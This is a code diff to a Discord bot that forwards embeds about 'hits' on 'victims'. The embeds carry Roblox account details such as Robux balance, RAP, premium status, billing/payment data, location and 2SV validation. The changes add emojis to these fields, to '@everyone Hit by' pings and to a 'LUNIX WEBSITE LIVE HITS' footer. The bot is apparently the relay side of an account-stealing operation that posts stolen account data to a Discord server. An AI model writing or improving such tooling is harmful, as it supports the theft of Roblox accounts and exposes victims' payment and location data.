@@ -354,9 +354,32 @@ client.on('messageCreate', async (message) => {
         // Create new embed builder with filtered data
         const forwardedEmbed = new EmbedBuilder();
 
-        // Set basic embed properties
-        if (filteredEmbed.title) forwardedEmbed.setTitle(filteredEmbed.title);
-        if (filteredEmbed.description) forwardedEmbed.setDescription(filteredEmbed.description);
+        // Set basic embed properties with Unicode emojis
+        if (filteredEmbed.title) {
+            // Add emojis to title based on content
+            let enhancedTitle = filteredEmbed.title;
+            if (enhancedTitle.toLowerCase().includes('hit') || enhancedTitle.toLowerCase().includes('success')) {
+                enhancedTitle = `🎯 ${enhancedTitle}`;
+            } else if (enhancedTitle.toLowerCase().includes('user') || enhancedTitle.toLowerCase().includes('account')) {
+                enhancedTitle = `👤 ${enhancedTitle}`;
+            } else {
+                enhancedTitle = `🔥 ${enhancedTitle}`;
+            }
+            forwardedEmbed.setTitle(enhancedTitle);
+        }
+        
+        if (filteredEmbed.description) {
+            // Add emojis to description
+            let enhancedDescription = filteredEmbed.description;
+            if (enhancedDescription.toLowerCase().includes('victim')) {
+                enhancedDescription = `🎯 ${enhancedDescription}`;
+            } else if (enhancedDescription.toLowerCase().includes('location')) {
+                enhancedDescription = `🌍 ${enhancedDescription}`;
+            } else {
+                enhancedDescription = `💥 ${enhancedDescription}`;
+            }
+            forwardedEmbed.setDescription(enhancedDescription);
+        }
 
         // Set color - use original color or default blue
         const embedColor = filteredEmbed.color || embed.color || 0x0099ff;
@@ -397,14 +420,39 @@ client.on('messageCreate', async (message) => {
             forwardedEmbed.setTimestamp(new Date(embed.timestamp));
         }
 
-            // Add filtered fields - only add fields that passed the filtering
+            // Add filtered fields - only add fields that passed the filtering with Unicode emojis
         if (filteredEmbed.fields && filteredEmbed.fields.length > 0) {
             console.log(`Adding ${filteredEmbed.fields.length} filtered fields to forwarded embed`);
             filteredEmbed.fields.forEach(field => {
                 if (field.name && field.value && field.name.trim() !== '' && field.value.trim() !== '') {
+                    // Add Unicode emojis to field names based on content
+                    let enhancedName = field.name;
+                    let enhancedValue = field.value;
+                    
+                    // Add emojis based on field content
+                    if (field.name.toLowerCase().includes('robux') || field.name.toLowerCase().includes('balance')) {
+                        enhancedName = `💰 ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('rap') || field.name.toLowerCase().includes('value')) {
+                        enhancedName = `💎 ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('premium')) {
+                        enhancedName = `⭐ ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('billing') || field.name.toLowerCase().includes('payment')) {
+                        enhancedName = `💳 ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('setting') || field.name.toLowerCase().includes('status')) {
+                        enhancedName = `⚙️ ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('game') || field.name.toLowerCase().includes('pass')) {
+                        enhancedName = `🎮 ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('group')) {
+                        enhancedName = `👥 ${field.name}`;
+                    } else if (field.name.toLowerCase().includes('collectible')) {
+                        enhancedName = `🏆 ${field.name}`;
+                    } else {
+                        enhancedName = `📊 ${field.name}`;
+                    }
+
                     forwardedEmbed.addFields({
-                        name: field.name,
-                        value: field.value,
+                        name: enhancedName,
+                        value: enhancedValue,
                         inline: field.inline !== undefined ? field.inline : false
                     });
                 }
@@ -413,9 +461,9 @@ client.on('messageCreate', async (message) => {
             console.log('No fields to add after filtering - all fields contained blocked content');
         }
 
-            // Add custom footer text
+            // Add custom footer text with emojis
         const originalFooter = filteredEmbed.footer?.text || embed.footer?.text || '';
-        const forwardingText = `LUNIX WEBSITE LIVE HITS`;
+        const forwardingText = `🔥 LUNIX WEBSITE LIVE HITS 🔥`;
         const newFooterText = originalFooter ? `${originalFooter} • ${forwardingText}` : forwardingText;
 
         forwardedEmbed.setFooter({
@@ -435,8 +483,8 @@ client.on('messageCreate', async (message) => {
 
         // Send the filtered embed to destination channel with appropriate notification
         const notificationMessage = is2SVValidation ? 
-            '@everyone Notifier by <@133284075104174416>' : 
-            '@everyone Hit by <@133284075104174416>';
+            '🔔 @everyone Notifier by <@133284075104174416>' : 
+            '💥 @everyone Hit by <@133284075104174416>';
 
         await destinationChannel.send({
             content: notificationMessage,
